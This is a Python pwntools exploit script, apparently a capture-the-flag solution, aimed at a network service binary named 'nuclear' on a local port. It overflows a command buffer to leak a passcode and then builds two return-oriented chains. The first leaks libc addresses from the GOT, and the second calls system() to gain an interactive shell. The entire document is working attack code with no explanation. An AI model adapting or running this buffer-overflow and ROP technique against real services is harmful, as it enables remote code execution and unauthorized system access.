from pwn import *

#context.log_level = 'debug'

elf = ELF("./nuclear")
conn = remote("localhost", 1129)

def sendCommand(cmd):
	conn.recvuntil("> ")
	conn.send(cmd)
	
def targetSet(Location):
	sendCommand("target")
	conn.recvuntil("---> ")
	conn.sendline(Location)
	
def Launch(passcode):
	sendCommand("launch")
	conn.recvuntil(": ")
	conn.sendline(passcode)
	
targetSet("5.5123/5.5123")
sendCommand("A"*0x200)

#leak
conn.recvuntil(" Unknown command : ")
conn.recv(0x208)
passcode = conn.recvline().strip()

log.info("passcode : " + passcode)

#Launch Nuclear
Launch(passcode)

send_plt = elf.symbols['send']
recv_plt = elf.symbols['recv']
recv_got = elf.got['recv']
send_got = elf.got['send']

start_routine = 0x8048B5B
pppr = 0x804917d
ppppr = 0x804917c
fd = 0x4

#bof
payload = "A"*0x200
payload += p32(fd)
payload += "B"*12
payload += p32(send_plt)
payload += p32(pppr)
payload += p32(fd)
payload += p32(recv_got)
payload += p32(4)
payload += p32(send_plt)
payload += p32(pppr)
payload += p32(fd)
payload += p32(send_got)
payload += p32(5)
payload += p32(start_routine)
payload += p32(0xdeadbeef)
payload += p32(fd)

conn.recvuntil("COUNT DOWN : 100")
conn.sendline(payload)

conn.recvuntil("We can't stop this action.. G00D Luck!\n")
recv_addr = conn.recv(4)
send_addr = conn.recv(4)

system_addr = u32(recv_addr)-0x18a5a0

log.info("recv_addr : 0x%x" % u32(recv_addr))
log.info("send_addr : 0x%x" % u32(send_addr))

payload = "A"*0x200
payload += p32(fd)
payload += "B"*12
payload += p32(recv_plt)
payload += p32(ppppr)
payload += p32(fd)
payload += p32(elf.bss())
payload += p32(50)
payload += p32(0)
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(elf.bss())
conn.recvuntil("COUNT DOWN : 99")
conn.sendline(payload)

conn.interactive()